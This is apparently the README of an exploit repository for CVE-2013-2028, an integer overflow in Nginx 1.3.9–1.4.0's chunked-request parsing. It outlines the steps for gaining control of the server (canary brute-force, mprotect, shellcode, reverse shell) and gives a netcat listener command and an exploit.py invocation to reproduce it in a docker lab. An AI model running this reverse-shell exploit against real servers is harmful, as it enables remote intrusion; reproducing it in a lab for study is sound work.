# CVE-2013-2028 Exploit

## Vulnerability details

Vulnerable software: Nginx 1.3.9 < 1.4.0  
Commit with fix: <https://github.com/nginx/nginx/commit/4997de8005630664ab35f27140e2077e818b21a7>  

Vulnerability exists in function ngx_http_parse_chunked. This exploit triggers integer overflow in ngx_http_parse_chunked, and later using it overflows the stack to hijack control flow.

## Exploitation details

Actual exploit contains 4 steps:

1. Find value of the stack canary using byte-by-byte bruteforce
2. Calculate address of mprotect using value from rcx (points somewhere in lpthread). Call mprotect with appropriate arguments.
3. Copy shellcode to RWX memory location.
4. Jump to shellcode, and start reverse shell.

## How to reproduce

1. start listener on host system, for example using netcat: `nc -lvp 4345`
2. on virtual machine start docker: `sudo docker-compose up --build`
3. run exploit: `python2 exploit.py -ra 127.0.0.1 -rp 8081 -la <listener machine address> -lp <listener machine port>`
4. Let the exploit find actual value of the canary, and start reverse-shell.

![Demo](https://i.imgur.com/BGtGiiN.png?1)
